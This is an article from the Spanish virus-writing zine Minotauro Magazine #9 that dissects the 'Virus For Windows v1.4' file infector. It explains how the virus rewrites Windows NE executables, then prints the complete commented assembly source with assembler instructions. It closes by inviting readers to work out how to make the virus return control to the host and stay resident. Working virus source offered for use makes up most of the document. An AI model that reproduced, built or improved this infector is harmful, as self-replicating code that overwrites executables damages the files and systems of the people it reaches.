@@ -1,0 +1,774 @@
+MINOTAURO MAGAZINE #9:
+
+			    Virus For Windows v1.4
+				  Por Trurl
+
+ // Introducci¢n //
+
+     Nuestro DEBUG, SOURCER, y dem s herramientas de disecci¢n hab¡an
+dormido durante demasiado tiempo, as¡ que decidimos desempolvarlas y volver
+al trabajo bienamado de desensamblado. 
+     Pero esto no es todo. Si hici‚ramos una encuesta entre usuarios de
+computadoras personales, revelar¡a que la mayor¡a de ellos usa alguna
+versi¢n de Windows en alg£n momento. Tambi‚n nos mostrar¡a que hay cada vez
+mas computadoras en las que la mayor cantidad de ejecutables corresponde a
+ejecutables de Windows. La gente que usa Windows ahora es de todos los
+niveles. No solo usan Windows (como suced¡a hace un cierto tiempo) aquellas
+personas que en realidad no conocen otra cosa, y creen que Windows es lo
+£nico que existe. Ahora hay ciertas personas que han ELEGIDO Windows, por
+sobre otros sistemas como OS/2 (o DOS obviamente). Por lo tanto todo hace
+pensar que nuestros peores temores se har n realidad; Windows, nos guste o
+no, es la plataforma de los pr¢ximos a¤os, para la inmensa mayor¡a de la
+gente. 
+     Podr¡amos entrar en la eterna discusi¢n AntiWindows-ProWindows pero no
+vamos a hacerlo, porque en realidad cada uno de nosotros, los que leemos y
+escribimos esto en este momento, sabe lo que quiere poner en su maquina,
+para que, y por que. Lo que nos interesa es el hecho incontrastable de que
+cada vez mas gente usa Windows.
+     Pero la proporci¢n de virus no se mantiene. Hay poqu¡simos virus de
+Windows (de hecho, para ser francos, se de la existencia de dos (2), y solo
+vi y examine uno (1), que es el protagonista de la presente nota). Desco-
+nozco porque la llamada "comunidad" de autores de virus, que fuera tan
+activa en el pasado, no hizo nada en todo este tiempo, o porque hay tan
+poca informaci¢n de Windows dando vuelta por esos canales, en fin, porque
+no pasa nada. 
+     Pero puedo conjeturar varios motivos; El hecho de que funcione en modo
+protegido ya amedrenta a unos cuantos, conceptos nuevos como task, descrip-
+tor, memoria lineal, f¡sica, l¢gica, etc, asusta a cualquiera. Luego el
+mismo hecho de que lo odiemos tanto (a Windows). Y por £ltimo el hecho de
+que la informaci¢n de bajo nivel de Windows esta muy, muy restringida
+porque los mismos desarrolladores de Windows no tienen idea como funciona
+el sistema a bajo nivel (no como suced¡a en DOS) porque ahora tienen
+herramientas "nuevas y sofisticadas" como el Visual Basic, Delphi, Visual
+C. Y Windows mismo pone mucho el acento en lo que se denomina "device
+independence", que consiste en que la interacci¢n entre una aplicaci¢n y el
+hardware es nula, inexistente, cero. Siempre esta el sistema en el medio,
+con sus APIs y dem s yerbas. (Eso es lo que hace por ejemplo que no haya
+tantos juegos, al menos no hasta el advenimiento del DirectX, porque el
+overhead que significaba llamar al sistema para updatear la pantalla hacia
+las cosas lent¡simas, no como antes en DOS que directamente se zarandeaba a
+la placa de video como uno quer¡a). Por lo tanto el resumen es que la
+informaci¢n a bajo nivel del sistema no interesa a nadie, excepto a los que
+hacen herramientas de desarrollo para Windows (compiladores, debugers,
+etc), o cosas afines. Y a nosotros desde luego. 
+     Sea como fuere, la informaci¢n existe. Windows es un sistema como
+cualquier otro, por mas que funcione en modo protegido, y los virus, en
+principio, deber¡an ser tan posibles en el como en DOS. 
+     Por eso para comenzar, y como primera nota de un tema que tenemos
+intenci¢n de seguir tratando (dentro de nuestras posibilidades), les
+ofrecemos el desensamblado de este simp tico virus para Windows, que
+alguien tuvo el buen tino de hacer. No es un gran virus para nada. Funcio-
+nalmente es un virus mediocre. Es el equivalente a lo que seria un virus
+runtime en dos (un no-residente), que para colmo no entrega el control al
+host. Pero es el primer virus de Windows que conocemos que infecta exitosa-
+mente. Por lo tanto veamos como, y luego les dejo el source del virus.
+
+ // Como funciona el Virus // 
+
+     Lo primero que notaran al ver el source es que es un EXE, y esta
+definido con un segmento de c¢digo y uno de datos. Esto se debe a que es
+necesario que el virus, al infectar (en un host infectado) se cargue con el
+c¢digo en el segmento de c¢digo (por un lado) y todos los datos y buffers
+en el segmento de datos (por el otro) porque en modo protegido no se puede
+escribir (y a veces tampoco leer) de un segmento de c¢digo. Por lo tanto
+todos los buffers y datos tienen que estar en su propio segmento cuando el
+virus es cargado en memoria por Windows. Esta es la raz¢n por la que el
+virus esta hecho as¡. (antes sencillamente pon¡amos todo en el mismo
+segmento y cuando quer¡amos acceder a un dato seteabamos DS a CS y listo, y
+gener bamos carriers que eran COM). Notaran adem s que el c¢digo empieza en
+el offset F9h, pero el virus escribe a partir del offset 100h; los bytes
+entre F9h y 100h son un c¢digo que inicializa DS, que solo es necesario en
+el carrier (que esta pensado para correrlo bajo DOS) pero no lo es cuando
+el virus corre bajo Windows, desde un host.
+     Lo que hace para infectar es sobreescribir el segmento de c¢digo y el
+segmento de datos del ejecutable que infecta con el c¢digo y los datos del
+virus, y graba el c¢digo y datos originales al final del file. (es equipa-
+rable al vetusto y entra¤able Jerusalem). Ahora, como lo hace es bastante
+complicado. Los segmentos dentro de un ejecutable de Windows est n defini-
+dos en una estructura que se encuentra dentro del EXE y se llama Segment
+Table (ver el articulo adjunto en este n£mero sobre la estructura de los
+EXE de Windows). El offset a la segment table dentro del ejecutable esta en
+el header del EXE (el NE, nuevo header, no el viejo header de DOS). En esta
+tabla (la Segment Table) se encuentran datos para cada segmento, como si se
+trata de un segmento de datos o c¢digo, si es escribible (si es de datos) o
+si es le¡ble (si es de c¢digo) y el offset, dentro del file, a los datos
+del segmento (a los contenidos de ese segmento). Entonces el c¢digo, para
+sobreescribir el segmento de c¢digo del ejecutable que quiere infectar con
+el c¢digo del virus, debe primero leer el NE, de all¡ conseguir el offset a
+la Segment Table, y dentro de esta conseguir la entrada correspondiente al
+segmento de c¢digo (cuyo n£mero de segmento, osea ¡ndice dentro de la
+Segment Table, esta en el NE), y dentro de esta entrada de la Segment Table
+consigue el offset de los datos del segmento de c¢digo (osea del sobado y
+sopapeado CODIGO del programa). Y all¡ es donde sobrescribe. (I hope you
+got that). Hace lo mismo para el segmento de datos, que sobrescribe con
+varios datos que necesita el virus. 
+     Ahora bien, esto en cuanto a como infecta. La cuesti¢n de retorno del
+control al host no esta resuelta en el virus. Aparentemente el autor pens¢
+que no seria posible, o en todo caso decidi¢ no intentarlo. El virus por lo
+tanto no retorna el control al host; sencillamente desinfecta el host y
+termina normalmente via 4C00. Hopefuly, el usuario vuelve a clickear en el
+icono de la aplicaci¢n, y todo el asunto pasa como un "click en falso". Al
+volver a correrse la aplicaci¢n, esta est  desinfectada.
+     Obviamente el virus no queda "residente" ni nada que se le parezca; es
+un virus runtime (es tan obvio que por eso no lo dije antes). Infecta todos
+los ejecutables de Windows que encuentra dentro del directorio donde se
+encuentra. No tiene m‚todo de b£squeda (como los virus runtime mas avanza-
+dos en DOS). Esto lo hace un virus con bastante poco alcance. (De hecho yo
+no consegu¡ un file infectado; me pasaron el carrier). 
+     En cuanto a la calidad del codigo, hay un monton de NOPs (solo dios
+sabe con que lo ensamblo), y un poco de codigo muerto, ademas de una
+estructura similar a las que se manda a 4B00 en ES:BX que no se usa nunca,
+lo que hace pensar que el autor intento correr la aplicacion desinfectada y
+no lo logro (dejando la estructura "olvidada" ahi). Por otro lado no hay
+nada mas que decir del codigo.
+     Como sea y para redondear, el virus aunque primitivo comparativamente
+a un virus similar de DOS, demuestra un modo exitoso de manipulaci¢n del
+header de un EXE de Windows. 
+
+ // Bill's Last Words //
+
+     Antes del c¢digo, un par de reflecciones y conjeturas, a las que
+llegamos observando el virus y la estructura de EXE de Windows. Ser 
+realmente imposible devolver el control al host? Quiz  si, en todo caso va
+a implicar una manipulaci¢n mayor del EXE. Por ejemplo se podr¡a agregar el
+c¢digo del virus al final del segmento de c¢digo (lo mismo los datos) y
+hacer un JMP intrasegmento al host. El problema es que el segmento de
+c¢digo puede no ser lo £ltimo que hay en el ejecutable, atr s del c¢digo
+puede haber todo tipo de gadorchas malignas e insospechadas (datos,
+bitmaps, iconos, y dem s boludeces Windozeanas). Habr¡a que mover para ac 
+y para all  medio EXE (y tomar¡a un tiempo proporcionalmente mayor). O sino
+lo que se podr¡a hacer es definir otro segmento y hacer un JMP intersegmen-
+to al host. Lo cual nos deja en la misma parada, ya que habr¡a que INSERTAR
+una entrada en la Segment Table. Y esto sin considerar que no estamos
+seguros que este JMP no cuelgue la protecci¢n por algo que no hemos
+considerado (alg£n registro quedo medio torcido). 
+     Por otro lado, la "residencia". Ser  imposible hacer un virus que
+quede en background para infectar? La pregunta queda planteada. Piensen
+esto: la cuesti¢n no es quedar en background en si, lo cual es f cil, sino
+reconseguir el control (tampoco muy complicado) y conseguir ejecutables
+para infectar (he aqu¡ la cuesti¢n). Reflexionenlo en sus hogares. 
+     Esto es todo, por hoy. Los dejo con el source.
+
+  // Bueno Y el Source?? //
+
+     Helo aqu¡. Esta comentado, pero les aviso que para entenderlo es
+recomendable tener al lado la tablita con la estructura del header de EXE
+de Windows, que acompa¤a esta edici¢n. Enjoy.
+
+- cut here ----------------------------------------------------------------
+; "Virus For Windows v1.4"
+; Virus runtime Infector de EXE de Windows
+; Ensamblar con el switch /m3 (tasm /m3 wvir.asm)
+; Desensamblado por Trurl para Minotauro Magazine #9
+
+;= DATA TYPES ===============================================================
+; Primero unas definiciones de estructuras que el codigo usa (defino todos
+; los campos aun los que no usa porque asi es mas comodo)
+
+DosExeHeader struc	; Header de EXE de DOS
+	D_Signature	dw	'ZM'; 00h : Signature for DOS header (MZ)
+	D_Reminder	dw	0	; 02h : Nr. of bytes in the last page
+	D_PageCount	dw	0	; 04h : Nr. of pages rounder up
+	D_RelocCount	dw	0	; 06h : Nr. of items in reloc table
+	D_HeaderSize	dw	0	; 08h : Header Size in paras including realoc table
+	D_MinAlloc	dw	0	; 0Ah : Minimum alloc (required)
+	D_MaxAlloc	dw	0	; 0Ch : Maximum alloc (desired, usualy ffff)
+	D_OrigSS	dw	0	; 0Eh : SS on start
+	D_OrigSP	dw	0	; 10h : SP on start
+	D_Checksum	dw	0	; 12h : Checksum for EXE (not used)
+	D_OrigIP	dw	0	; 14h : IP on start (ep)
+	D_OrigCS	dw	0	; 16h : CS on start (ep)
+	D_RealocTblOff	dw	0	; 18h : Offset to realoc table relative to begining of file
+	D_Overlay	dw	0	; 1Ah : Nr of overlays (not used)
+			dw	10h dup(0); 1Ch : Reserved space
+	D_NEOffset	dd	0	; 3Ch : Offset to NE header (if there is one)
+DosExeHeader ends
+
+WinExeHeader struc   ; Header de EXE de Windows
+	W_Signature	dw	0	; 00h : Signature for windows header (NE)
+	W_LinkerVer	dw	0	; 02h : Linker version (lo bytes is version nr., hi byte is revision nr.)
+	W_EntryTblOff	dw	0	; 04h : Offset of entry table relative to begining of header
+	W_EntryTblLen	dw	0	; 06h : Size of entry table in bytes
+	W_Reserved1	dw	0,0	; 08h	: CRC of entire file ?
+	W_Flags		dw	0	; 0Ch : Flags that describe the EXE
+	W_DataSegment	dw	0	; 0Eh : Automatic data segment number (is index in segment table)
+	W_HeapSize	dw	0	; 10h : Initial size of heap in bytes
+	W_StackSize	dw	0	; 12h : Initial size of stack in bytes
+	W_OrigIP	dw	0	; 14h : IP on start
+	W_OrigCS	dw	0	; 16h : Code segment
+	W_OrigSP	dw	0	; 18h : SP on start
+	W_OrigSS	dw	0	; 1Ah : Stack segment
+	W_SegmTblCount	dw	0	; 1Ch : Number of entries in the segment table
+	W_ModTblCount	dw	0	; 1Eh : Number of entries in the module-reference table
+	W_NRNTblCount	dw	0	; 20h : Number of entries in the nonresident-name table
+	W_SegmTblOff	dw	0	; 22h : Offset of segment table relative to begining of header
+	W_ResTblOff	dw	0	; 24h : Offset of resource table relative to begining of header
+	W_RNTblOff	dw	0	; 26h : Offset of resident-name table relative to begining of header
+	W_ModTblOff	dw	0	; 28h : Offset of module-reference table relative to begining of header
+	W_INameTblOff	dw	0	; 2Ah : Offset of imported-name table relative to begining of header
+	W_NRNTblOff	dd	0	; 2Ch : Offset of nonresident-name table relative to begining of FILE
+	W_MoveEP	dw	0	; 30h	: Number of moveable entry points (?)
+	W_ShiftCount	dw	0	; 32h : Shift count used to align sectors
+	W_ResSegmCount	dw	0	; 34h : Number of resource segments
+	W_TargetOS	db	0	; 36h : Target operating system
+	W_Info		db	0	; 37h : Additional info
+	W_FastLoadOff	dw	0	; 38h : offset in sectors to the begining of the fastload area
+	W_FastLoadLen	dw	0	; 3Ah : length in sectors of the fast load area
+	W_Reserved2	dw	0	; 3Ch
+	W_WinVer	dw	0	; 3Eh : Expected windows version
+WinExeHeader ends
+
+SegmentTableEntry struc		; Entrada de la Segment Tabvle
+	SegmentOff	dw	0	; 0h : Offset in segments to the segment data
+	SegmentLen	dw	0	; 2h : Size of segment in bytes
+	SegmentType	dw	0	; 4h : flags for segment type
+	SegmentMinAlloc	dw	0	; 6h : minimum allocation size
+SegmentTableEntry ends
+
+code segment para public
+	assume cs:code, ds:data, ss:data, es:data
+	NOSMART
+
+;= CARRIER ==================================================================
+	; Este peque¤o codigo solo es parte del carrier, no del virus, que es
+	; cargado con DS ya inicalizado al segmento de datos en los hosts que
+	; infecta. Como el virus debe empezar desde 100h, hay que hacer este
+	; arreglito:
+	org	100h - (carrierend - carrierstart)
+carrierstart:
+	MOV	AX,CS
+	ADD	AX, CODELEN
+	MOV	DS,AX
+carrierend:
+
+;= VIRUS CODE ===============================================================
+	; Aqui comienza el virus en si
+	org 100h
+virstart:
+	; Copia el nombre del ejecutable actual (del host actual) desde la DTA,
+	; que es donde la 4E lo dejo antes de que infectara, a un buffer especial.
+	CLD
+	PUSH	ES
+	PUSH	DS
+	POP	ES
+	MOV	SI,offset DTAfname
+	MOV	DI,offset FileName
+	MOV	CX,13
+	REPZ
+	MOVSB
+
+	; setea el address de la DTA a la estructura
+	MOV	DX,offset DTA
+	MOV	AH,1Ah
+	INT	21h
+
+	; comienza la busqueda de *.EXEs
+	MOV	DX, offset FileMask
+	XOR	CX,CX
+	MOV	AH,4Eh
+keeplooking:
+	INT	21h
+	JB	nomorefound 	; No encuentra mas EXE; salir
+	; Encontro un EXE ; intentar infectarlo
+	MOV	DX,offset DTAfname
+	CALL	infect
+	; Sigue buscando EXEs
+	MOV	AH,4FH
+	JMP	keeplooking ; keep looking
+
+nomorefound:
+	; No se encontraron mas EXEs; desinfectar el file actual
+	MOV	DX,offset FileName
+	CALL	clean
+	POP	ES
+	; y terminar normalmente
+	MOV	AX,4C00h
+	INT	21h
+
+infect:
+	; abrir el file
+	MOV	AX,3D02h
+	INT	21h
+	JB	quitinfect		; salir si no se lo pudo abrir
+	XCHG	BX,AX
+
+	; verificar que el file sea valido para la infeccion
+	MOV	SI,offset HeaderBuffer
+	CALL	verifyfile
+	JB	abortinfect ; si no es valido no lo infecta
+
+	; Verificar que el IP del header no sea igual a 100h, esto actua como
+	; marca de infeccion ademas. Si el IP del header es 100h, el file
+	; probablemente ya esta infectado.
+	CMP	WORD PTR [SI+W_OrigIP],0100h
+	JZ	abortinfect ; si ya esta infectado no lo infecta
+
+	; conseguir la date & time del file y guardarlas
+	MOV	AX,5700h
+	INT	21h
+	PUSH	CX
+	PUSH	DX
+	CALL	infectfile ; infectar el file
+	POP	DX
+	POP	CX
+
+	; restaurar la date & time originales del file
+	MOV	AX,5701h
+	INT	21h
+
+abortinfect:
+	; cerrar el file
+	MOV	AH,3Eh
+	INT	21h
+
+quitinfect:
+	RET ; salir
+
+clean:
+	; abrir el file
+	MOV	AX,3D02h
+	INT	21h
+	JB	quitinfect
+	XCHG	BX,AX
+
+	; Verificar si el file es valido y que esta infectado
+	MOV	SI,offset HeaderBuffer
+	CALL	verifyfile
+	JB	abortinfect
+	CMP	WORD PTR [SI+W_OrigIP],0100h
+	JNZ	abortinfect
+
+	; guardar los atributos originales del file
+	MOV	AX,5700h
+	INT	21h
+	PUSH	CX
+	PUSH	DX
+
+	; porque el autor puso el codigo de desinfeccion en dos rutina y no
+	; en una escapa a mi comprension
+	CALL	disinfect
+	CALL	continue_disinfect
+
+	; restaurar los atributos originales del file
+	POP	DX
+	POP	CX
+	MOV	AX,5701h
+	INT	21h
+
+	; salir
+	JMP	abortinfect
+
+verifyfile:
+; Esta rutina verifica que un EXE sea viable para la infeccion. El handle
+; viene en BX
+
+	; Leer el header a HeaderBuffer
+	CALL	readhdr
+
+	CMP	WORD PTR [SI],'ZM'	; es un EXE? Verificar la Signature
+	JNZ	wrongfile
+
+	; si la tabla de realocacion no esta en 40h, entonces no es un EXE de
+	; Windows
+	CMP	WORD PTR [SI+D_RealocTblOff],40H
+	JB	wrongfile
+
+	; Conseguir el offset del Header de Windows y mover alli el puntero
+	MOV	AX,[SI+offset D_NEOffset]
+	MOV	DX,[SI+offset D_NEOffset+2]
+	CALL	fseek
+
+	; salvar el offset del header de windows para calcular bien los offset relativos al comienzo del header
+	MOV	DS:word ptr NEOffset,AX
+	MOV	DS:word ptr NEOffset+2,DX
+
+	; leer el header de windows a HeaderBuffer
+	CALL	readhdr
+
+	; Es un EXE de Windows Valido?
+	CMP	WORD PTR [SI+W_Signature],'EN'
+	JNZ	wrongfile ; 01CF
+
+	; El bit 1 (0x002) significa que el file es MULTIPLEDATA. Los bits 8 y 9
+	; (0x0100 | 0x0200) estan marcados como reserved. (?)
+	CMP	WORD PTR [SI+W_Flags],0302h
+	JNZ	wrongfile
+
+	; si la alineacion de los segmentos del file no es por paragrafos
+	; (un shift count = 4) no se puede infectar
+	CMP	BYTE PTR [SI+W_ShiftCount],04h
+	JNZ	wrongfile
+
+	; target operating system = windows
+	CMP	WORD PTR [SI+W_TargetOS],0802h
+	JNZ	wrongfile
+	CLC
+	RET
+wrongfile:
+	STC
+abortinfectfile:	; spaghetti code al viejo estilo
+	RET
+
+infectfile:
+; Esta rutina infecta el file, luego de que ya se ha verificado que el file
+; se puede infectar. DS:SI apunta a HeaderBuffer (en donde esta leido el NE header)
+
+	; Lee la entrada de la segment table correspondiente
+	; al segmento de codigo
+	MOV	AX,[SI+W_OrigCS]
+	MOV	DX,offset CodeSegment
+	CALL	readsegm
+
+	; Si el size del segmento de codigo es menor a 3AE
+	CMP	DS:WORD PTR [CodeSegment+SegmentLen],3AEH ; HERE I AM
+	JB	abortinfectfile
+
+	; si el segmento de codigo no es MOVEABLE & EXECUTEONLY aborta
+	CMP	DS:BYTE PTR [CodeSegment+SegmentType],50h
+	JNZ	abortinfectfile
+
+	; leer la entrada de la seg.table corresp. al segmento de datos automatico
+	MOV	AX,[SI+W_DataSegment]
+	MOV	DX,offset DataSegment
+	CALL	readsegm
+
+	; si el largo del segmento de datos < 4A8, aborta
+	CMP	DS:WORD PTR [DataSegment+SegmentLen],4A8H; HERE I AM
+	JB	abortinfectfile
+
+	; lee los primeros bytes del segmento de codigo a la heap
+	MOV	AX,DS:word ptr [CodeSegment+SegmentOff]
+	CALL	fseek2segment
+	MOV	DX,offset heapstart
+	MOV	CX,CODESIZE
+	NOP
+	CALL	read
+
+	; y los escribe al final del file
+	CALL	gotoeof
+	MOV	DX,offset heapstart
+	MOV	CX,CODESIZE
+	NOP
+	CALL	write
+
+	; leer los primeros bytes del segmento de datos a la heap
+	MOV	AX,ds:word ptr [DataSegment+SegmentOff]
+	CALL	fseek2segment
+	MOV	DX,offset heapstart
+	MOV	CX,heapstart - datastart
+	NOP
+	CALL	read
+
+	; y los escribe al final
+	CALL	gotoeof
+	MOV	DX,offset heapstart
+	MOV	CX,heapstart - datastart
+	NOP
+	CALL	write
+
+	;	salvar las flags del segmento de codigo para luego poder desinfectar
+	PUSH	word ptr [CodeSegment+SegmentType]
+	POP	[OldCSFlags]
+
+	; baja el bit de discardable. Si el segmento de codigo era
+	; discardable, ahora no lo es.
+	AND	ds:WORD PTR [CodeSegment+SegmentType],0FEFFh
+
+	; escribe la entrada del segment table correspondiente al segm de codigo
+	; (que acaba de modificar)
+	MOV	AX,[SI+W_OrigCS]
+	MOV	DX,offset CodeSegment
+	CALL	writesegm
+
+	; va al principio del header
+	XOR	AX,AX
+	CWD
+	CALL	fseekrel
+
+	; salva IP del header para luego poder desinfectar
+	PUSH	[SI+W_OrigIP]
+	POP	[OldIP]
+
+	; nuevo IP = 100h
+	MOV	WORD PTR [SI+W_OrigIP],100h
+
+	; escribe el header modificado
+	CALL	writehdr
+
+	; va a la posicion del file donde empiezan los datos del segmento de
+	; codigo
+	MOV	AX,ds:word ptr [CodeSegment+SegmentOff]
+	CALL	fseek2segment
+
+	; y escribe el virus alli (al principio del segmento de codigo)
+	PUSH	DS
+	PUSH	CS ; NOTESE QUE EL CODIGO NUNCA USA ESTE DS,
+	POP	DS ; si lo hiciera, saltaria la proteccion
+	MOV	DX,offset virstart
+	MOV	CX,CODESIZE
+	NOP
+	CALL	write
+	POP	DS
+
+	; y escribe la data del virus al principio del segmento de datos
+	MOV	AX,ds:word ptr [DataSegment+SegmentOff]
+	CALL	fseek2segment
+	MOV	DX,offset virstart
+	MOV	CX,heapstart-datastart
+	NOP
+	CALL	write
+
+	RET	; ya infecto!
+
+disinfect:
+; Esta rutina desinfecta el host actual. El header, la entrada del segmento
+; de codigo y de datos estan leidas en sus respectivos buffer. El nombre
+; del file esta en FileName
+
+	; leer la entrada del segment table corresp al segm de datos de la aplic.
+	MOV	AX,[SI+W_DataSegment]
+	MOV	DX,offset DataSegment
+	CALL	readsegm
+
+	; seekear a la data del segmento de datos
+	MOV	AX,ds:word ptr [DataSegment+SegmentOff]
+	CALL	fseek2segment
+
+	; leer la data del segmento de data
+	MOV	DX,offset virstart
+	MOV	CX,heapstart-datastart
+	NOP
+	CALL	read
+	RET
+
+continue_disinfect:
+	; restaurar las flags del segmento de codigo
+	; dentro del segment table
+	PUSH	ds:word ptr [OldCSFlags]
+	POP	ds:word ptr [CodeSegment+SegmentType]
+
+	; escribe la entrada del segmento de codigo dentro de la segment table
+	; (que acaba de restaurar y desinfectar)
+	MOV	AX,[SI+W_OrigCS]
+	MOV	DX,offset CodeSegment
+	CALL	writesegm
+
+	; restaura el IP original del exe
+	PUSH	ds:word ptr [OldIP];[01A0]	; en 1A0 esta salvado el IP
+	POP	[SI+W_OrigIP]
+
+	; seekea al principio del NE
+	XOR	AX,AX
+	CWD
+	CALL	fseekrel
+
+	; reescribe el header "des-modificado"
+	CALL	writehdr
+
+	; lee los datos originales del principio del segmento de datos (que esta
+	; al final del file)
+	CALL	gotoeof
+	SUB	AX,heapstart-datastart
+	NOP
+	SBB	DX,0
+	PUSH	AX
+	PUSH	DX
+	CALL	fseek
+	MOV	DX,offset heapstart
+	MOV	CX,heapstart-datastart
+	NOP
+	CALL	read
+
+	; seekea al principio del segmento de datos
+	MOV	AX,ds:word ptr [DataSegment+SegmentOff]
+	CALL	fseek2segment
+
+	; re-escribe el principio del segmento de datos con los datos originales
+	MOV	DX,offset heapstart
+	MOV	CX,heapstart-datastart
+	NOP
+	CALL	write
+
+	; lee el codigo original del segmento de codigo que esta al final del
+	; file, antes de los datos
+	POP	DX
+	POP	AX
+	SUB	AX,CODESIZE
+	NOP
+	SBB	DX,0
+	PUSH	AX
+	PUSH	DX
+	CALL	fseek
+	MOV	DX,offset heapstart
+	MOV	CX,CODESIZE
+	NOP
+	CALL	read
+
+	; seekea al principio del segmento de codigo
+	MOV	AX,ds:word ptr [CodeSegment+SegmentOff]
+	CALL	fseek2segment
+
+	; y lo escribe
+	MOV	DX,offset heapstart
+	MOV	CX,CODESIZE
+	NOP
+	CALL	write
+
+	; seekea al principio del codigo agregado
+	POP	DX
+	POP	AX
+	CALL	fseek
+
+	; y alli escribe 0 bytes (corta el file)
+	MOV	CX,0
+	CALL	write
+	RET		; ya desinfecto
+
+readsegm:
+; Esta rutina lee un segmento de la segment table del EXE.
+; parametros:
+; AX = numero de segmento a leer
+; BX = handle del file
+; DX = offset donde leer la entrada (8 bytes)
+	PUSH	DX
+	DEC	AX			; la tabla es 1-based????
+	MOV	CX,8
+	MUL	CX			; multiplica el nro de segmento por 8 (el largo de cada entrada)
+	ADD	AX,[SI+W_SegmTblOff]
+	ADC	DX,0		; a eso le agrega el offset del principio de la tabla
+	CALL	fseekrel ; y va alli relativo al principio del header
+	POP	DX
+	MOV	CX,8		; y ahora lee los 8 bytes y vuelve
+	JMP	read
+
+readhdr:	; 333
+; Esta rutina lee 40h bytes de un file (se la usa para leer los header MZ y
+; NE, de ahi el nombre). El handle viene en BX, se lo lee a HeaderBuffer
+	MOV	DX,offset virstart
+	MOV	CX,40h
+read:
+	MOV	AH,3Fh
+	INT	21h
+	RET
+
+writesegm:
+; Esta rutina es igual a la rutina readsegm, excepto que escribe en vez
+; de leer. Los parametros son iguales.
+	PUSH	DX
+	DEC	AX
+	MOV	CX,8
+	MUL	CX
+	ADD	AX,[SI+W_SegmTblOff]
+	ADC	DX,0
+	CALL	fseekrel
+	POP	DX
+	MOV	CX,8
+	JMP	write
+
+writehdr:
+; Esta rutina se usa para escribir el header NE modificado
+	MOV	DX,offset virstart
+	MOV	CX,40h
+write:
+	MOV	AH,40h
+	INT	21h
+	RET
+
+gotoeof:
+	MOV	AX,4202h
+	XOR	CX,CX
+	CWD
+	INT	21h
+	RET
+
+fseekrel:
+; Esta rutina mueve el puntero del file relativamente al principio del NE
+; header, cuyo offset esta en NEOffset
+	ADD	AX,ds:word ptr NEOffset
+	ADC	DX,ds:word ptr NEOffset+2
+	JMP	fseek
+
+fseek2segment:
+; Rutina que mueve el puntero del file sobre los datos de un segmento.
+; parametro; AX = offset del segmento en sectores (paras).
+	MOV	CX,10h
+	MUL	CX
+	ADD	AX,100h
+	ADC	DX,0
+	JMP	fseek
+
+	; CODIGO MUERTO, 3 BYTES
+	XOR	AX,AX
+	CWD
+
+fseek:
+; Self explanatory
+	XCHG	CX,DX
+	XCHG	DX,AX
+	MOV	AX,4200h
+	INT	21h
+	RET
+
+	; CODIGO MUERTO, 9 BYTES
+	XCHG	CX,DX
+	XCHG	DX,AX
+	MOV	AX,4201h
+	INT	21h
+	RET
+
+VirusName	db	" Virus_for_Windows  v1.4 ",0,0,0
+			; Un nombre de una descollante originalidad :)
+virend:
+ends
+
+;= VIRUS DATA ===============================================================
+data segment para public
+	org 100h
+datastart label
+CODELEN		equ	(virend-virstart+15 + 100h) SHR 4
+			; tama¤o del codigo en paras redondeado hacia arriba
+CODESIZE	equ	(virend-virstart-2)
+			; tama¤o del codigo en bytes
+HeaderBuffer	db	40h dup('a')
+			; En este buffer lee los header NE y MZ
+CodeSegment	db	8 dup('b')
+			; En este buffer lee la entrada de la segment table
+			; correspondiente al segmento de codigo
+DataSegment	db	8 dup('c')
+			; En este buffer lee la entrada de la segment table
+			; correspondiente al segmento de datos
+DTA		db	30 dup('d')
+			; la DTA que usa para el findfirst/findnext
+DTAfname		db		13 dup('d')
+			; El filename retornado por findfirst/findnext
+FileMask		db		"*.EXE",0
+			; usado para el findfirst/findnext
+FileName		db		13 dup('e')
+			; aqui el virus copia el filename del file
+			; actual antes de volver a usar la DTA
+			dw		8000h,0,0,5ch,0,6ch,0
+			; a primera vista esto que esta aca arriba
+			; tiene toda la pinta de ser una de las estructuras
+			; que se mandan a 4B00 en ES:BX, pero nunca es
+			; usada en el codigo. Quiza el autor intento correr
+			; ‚l la aplicacion host desinfectada y no lo logro,
+			; olvidando esta estructura aca?
+NEOffset		dd		0
+			; offset del NE dentro del file (usado para calcular los otros offsets)
+OldIP			dw		0
+			; IP original del NE del file infectado
+OldCSFlags		dw		0
+			; flags originales del segmento de codigo
+			db		"MK92"
+			; iniciales del autor y a¤o?
+heapstart label
+	db		"Hola! Soy un source de Minotauro. Trurl, tgc"
+ends
+end carrierstart
+- cut here ----------------------------------------------------------------
+
+     Hasta la pr¢xima edici¢n de Minotauro (QUE VA A SEGUIR SALIENDO POR SI
+A ALGUIEN LE CABE ALGUNA DUDA, OSEA QUE VA A HABER UNA PROXIMA EDICION, NO
+SE ACABA ACA, ETC) :). Y como ultimas palabras de este articulo : PIENSEN-
+LON. Eso es todo.
+                                                                 Trurl, tgc
